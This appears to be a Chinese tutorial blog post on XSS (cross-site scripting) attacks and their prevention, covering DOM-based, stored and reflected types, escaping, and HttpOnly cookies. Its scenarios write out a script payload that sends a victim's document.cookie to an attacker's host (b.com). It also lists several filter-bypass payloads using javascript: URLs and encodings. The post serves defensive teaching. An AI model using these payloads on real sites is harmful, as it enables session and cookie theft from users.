title: XSS攻击及预防
date: 2017-02-18 14:45:23
tags: [网络安全]
---

## XSS攻击是什么
- XSS又称CSS，全称Cross SiteScript跨站脚本攻击的缩写，是一种网站应用程序的安全漏洞攻击，是代码注入的一种。
- 通常是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。
- 这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。
- 攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和盗取用户Cookie、破坏页面结构、重定向到其它网站等

### XSS攻击基本原理——代码注入

在web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进行攻击——将恶意代码注入合法代码里隐藏起来，再诱发恶意代码，从而进行各种各样的非法活动。只要破坏跨层协议的数据/指令的构造，我们就能攻击。
历史悠久的`SQL注入`和`XSS注入`都是这种攻击方式的典范。现如今，随着参数化查询的普及，我们已经离`SQL注入`很远了。但是，历史同样悠久的`XSS`却没有远离我们。
`XSS`的基本实现思路很简单——比如`持久型XSS`通过一些正常的站内交互途径，例如发布评论，提交含有`JavaScript`的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本，从而被攻击。

攻击分类举例
### DOM-based XSS
基于DOM的XSS，通过对具体DOM代码进行分析，根据实际情况构造dom节点进行XSS跨站脚本攻击，该攻击特点是中招的人是少数人。
**场景一**：
当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似： 
```html
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<!DOCTYPEhtmlPUBLIC"-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
   <title>XSS测试</title>
</head>
<body>
   页面内容：<%=request.getParameter("content")%>
</body>
</html>
```

我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！这个过程中，受害者只有Tom自己。那当我在浏览器输入a.com?content=<script>alert(“xss”)</script>，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己，那我如何攻击别人并且获利呢？

### 持久型XSS
也叫存储型XSS——主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。可以描述为:恶意用户的HTML或JS输入服务器->进入数据库->服务器响应时查询数据库->用户浏览器。

**场景二**：
a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“www.b.com?param=”+document.cookie)</script>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。Stored XSS漏洞危害性更大，危害面更广。

### 反射型XSS
反射性XSS，也就是被动的非持久性XSS。诱骗用户点击URL带攻击代码的链接，服务器解析后响应，在返回的响应内容中隐藏和嵌入攻击者的XSS代码，被浏览器执行，从而攻击用户。
URL可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏自己。

### 使用XSS Filter
- 输入过滤，所有用户输入都是不可信的。”（注意: 攻击代码不一定在<script></script>中），对用户提交的数据进行有效性验证，仅接受指定长度范围内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据。

  | less-than character (<)                                      | &lt;                                                     |
  | ------------------------------------------------------------ | -------------------------------------------------------- |
  | greater-than character (>)                                   | &gt;                                                     |
  | ampersand character (&)                                      | &amp;                                                    |
  | double-quote character (")                                   | &quot;                                                   |
  | space character( )                                           | &nbsp;                                                   |
  | Any ASCII code character whose code is greater-than or equal to 0x80 | &#<number>, where <number> is the ASCII character value. |

比如用户输入：<script>window.location.href=”http://www.baidu.com”;</script>，保存后最终存储的会是&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。



- 输出转义，当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS特殊字符，为了确保输出内容的完整性和正确性，输出HTML属性时可以使用HTML转义编码（HTMLEncode）进行处理，输出到<script>中，可以进行JS编码。

### 使用 HttpOnly Cookie
将重要的cookie标记为httponly，这样的话当浏览器向Web服务器发起请求的时就会带上`cookie`字段，但是在`js`脚本中却不能访问这个cookie，这样就避免了XSS攻击利用`JavaScript`的`document.cookie`获取`cookie`。

### CSP策略

单篇说

### 困难和幸运

过滤 Html 标签能否防止 XSS? 请列举不能的情况?

用户除了上传

```
<script>alert('xss');</script>
```

还可以使用图片 url 等方式来上传脚本进行攻击

```
<table background="javascript:alert(/xss/)"></table>
<img src="javascript:alert('xss')">
```

还可以使用各种方式来回避检查, 例如空格, 回车, Tab

```
<img src="javas cript:
alert('xss')">
```

还可以通过各种编码转换 (URL 编码, Unicode 编码, HTML 编码, ESCAPE 等) 来绕过检查

```
<img%20src=%22javascript:alert('xss');%22>
<img src="javascrip&#116&#58alert(/xss/)">
```

真正麻烦的是，在一些场合我们要允许用户输入HTML，又要过滤其中的脚本。这就要求我们对代码小心地进行转义。否则，我们可能既获取不了用户的正确输入，又被XSS攻击。
幸好，由于XSS臭名昭著历史悠久又极其危险，现代web开发框架如`vue.js`、`react.js`等，在设计的时候就考虑了XSS攻击对html插值进行了更进一步的抽象、过滤和转义，我们只要熟练正确地使用他们，就可以在大部分情况下避免XSS攻击。
同时，许多基于`MVVM`框架的`SPA`（单页应用）不需要刷新URL来控制view，这样大大防止了XSS隐患。另外，我们还可以用一些防火墙来阻止XSS的运行。

## 参考
https://blog.csdn.net/ghsau/article/details/17027893

https://www.imooc.com/article/13553

https://blog.csdn.net/u011781521/article/details/53894399

https://elemefe.github.io/node-interview/#/sections/zh-cn/security?id=xss


